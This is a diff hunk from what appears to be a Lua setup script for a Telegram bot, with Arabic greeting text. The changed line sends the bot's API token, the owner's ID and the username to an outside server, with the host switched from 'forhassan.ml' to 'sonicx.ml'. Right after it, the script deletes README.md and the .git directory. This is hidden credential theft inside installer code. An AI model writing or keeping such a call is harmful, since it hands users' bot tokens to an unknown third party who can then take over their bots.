@@ -108,7 +108,7 @@ local Text = "•~اهلا عزيزي [المطور الاساسي](tg://user?id
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 Souser = SUDO_USER:gsub('@','')
 Souser = Souser:gsub([[\_]],'_')
-https.request("https://forhassan.ml/Black/DANY.php?id="..SUDO_USER.."&user="..Souser.."&token="..Token)
+https.request("https://sonicx.ml/Kgt/Kgt.php?id="..SUDO_USER.."&user="..Souser.."&token="..Token)
 os.execute([[
 rm -f ./README.md
 rm -rf ./.git
